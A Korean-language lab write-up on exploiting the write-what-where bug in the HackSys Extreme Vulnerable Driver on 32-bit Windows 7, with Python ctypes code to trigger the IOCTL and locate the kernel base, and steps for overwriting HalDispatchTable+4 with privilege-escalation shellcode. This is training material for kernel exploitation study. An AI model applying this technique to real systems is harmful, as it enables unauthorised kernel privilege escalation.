# Part 2. ArbitraryOverwrite

[hacksysteam site] : https://rootkits.xyz/blog/2017/09/kernel-write-what-where/

## 1. Analysis
ArbitraryOverwrite 취약점은 우리가 익히 알고있는 Write-What-Where vulnerability 이다. 
즉, 어느곳이든 공격자가 Write 하고싶은 주소에 원하는 value를 넣을 수 있다.

<img width="725" alt="2018-12-10 3 45 47" src="https://user-images.githubusercontent.com/35731091/49715251-1d7e2b00-fc93-11e8-9f0b-ee9188e947a3.png">

what, where에 원하는 값을 넣을 수가 있다. 

### 취약점이 무엇인지 살펴보자,
* secure 부분을 보면 ProbeForRead() function을 이용하여, 공격자가 넣어준 what, where값이 user영역인지를 검사한다. kernel부분이면 예외가 발생한다.
* secure 부분이 아닌 곳을 보면, ProbeForRead()함수를 이용하여 check하지 않음으로써 where주소가 kernel영역이여도 정상적으로 진행하게 된다.

### To call TriggerArbitraryOverwrite

    import ctypes, sys, struct
    from ctypes import *
    from subprocess import *
 
     def exploit():
         kernel32 = windll.kernel32
         psapi = windll.Psapi
         ntdll = windll.ntdll
         hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
 
         if not hevDevice or hevDevice == -1:
             print "*** Couldn't get Device Driver handle"
             sys.exit(-1)
 
         buf = "A"*4+"B"*4
         bufLength = len(buf)
 
         kernel32.DeviceIoControl(hevDevice, 0x22200b, buf, bufLength, None, 0, byref(c_ulong()), None) 

     if __name__ == "__main__":
         exploit()
\`

*Result

<img width="360" alt="2018-12-10 4 09 33" src="https://user-images.githubusercontent.com/35731091/49716106-0ab92580-fc96-11e8-8aa3-a9aa04d05f64.png">


## 2. Process Exploit

What , Where 중에서 What은 당연 권한상승을 위한 쉘 코드(Shellcode)가 되어야 할것이다. 그렇다면 Where은 어느곳의 주소를 써야할까??

[poppopret] : http://poppopret.blogspot.com/2011/07/windows-kernel-exploitation-basics-part.html


이 블로그를 참조하면서 많은 도움이 되었다. 
자세한 것은 이 블로그를 참조하면 좋을 것 같다.

이 블로그의 내용을 간단히 정리하여 적용해보자면,,,,

<img width="286" alt="2018-12-10 4 23 30" src="https://user-images.githubusercontent.com/35731091/49716734-fb3adc00-fc97-11e8-9dc4-feb45d9a9f1d.png">

로 정리해 볼 수 있다.

- nt!NtQueryIntervalProfile -> call KeQueryIntervalProfile

<img width="652" alt="2018-12-10 4 26 47" src="https://user-images.githubusercontent.com/35731091/49716894-77352400-fc98-11e8-8b42-bf969eb3d408.png">

- nt!KeQueryIntervalProfile -> call HalDispatchTable + 0x4

<img width="615" alt="2018-12-10 4 31 17" src="https://user-images.githubusercontent.com/35731091/49717046-0b9f8680-fc99-11e8-981e-40e5588f7f66.png">

이제 어떤 곳을 Where 값으로 주어야 하는 지 알게되었다.
가장 선행되어야하는 것은 먼저 Kernel Module의 주소를 구해야 하는 것이다.
현재 진행하는 Windows 7 32bit환경에서는 kernel에 대한 module이 ntkrnlpa.exe이다. 

### 1. Procedure 
* 1. 커널 모듈인 ntkrnlpa.exe를 User 영역으로 가져와야한다.(그래야 컨트롤이 가능)
* 2. ntkrnlpa.exe에서 HalDispatchTable의 주소를 가져온다.
* 3. HalDispatchTable+4를 쉘코드로 OverWrite한다.

### 2. ntkrnlpa.exe Address

    import ctypes, sys, struct
    from ctypes import *
    from subprocess import *

    def ntkrnl():
        kernel32 = windll.kernel32
        psapi = windll.Psapi
        ntdll = windll.ntdll
 
        #Enumerating load addresses for all device drivers, and fetching base address and name for ntkrnlpa.exe
        enum_base = (c_ulong * 1024)()
        enum = psapi.EnumDeviceDrivers(byref(enum_base), c_int(1024), byref(c_long())) #EnumDeviceDrivers(): 드라이버들의 주소들을                                                                                                                나열한다. 
        if not enum:
            print "Failed to enumerate!!!"
            sys.exit(-1)
			
        for base_address in enum_base: #ntkrnl.exe가 나올때 까지 반복
            if not base_address:
                continue

            base_name = c_char_p('\x00' * 1024)
            driver_base_name = psapi.GetDeviceDriverBaseNameA(base_address, base_name, 48) #해당 base_address의 Name(이름)을 구한                                                                                               다.
            if not driver_base_name:
                print "Unable to get driver base name!!!"
                sys.exit(-1)
 
            if base_name.value.lower() == 'ntkrnl' or 'ntkrnl' in base_name.value.lower():
                base_name = base_name.value
                print "[+] Loaded Kernel: {0}".format(base_name)
                print "[+] Base Address of Loaded Kernel: {0}".format(hex(base_address))
                break

    if __name__ == "__main__":
        ntkrnl()
    
\`

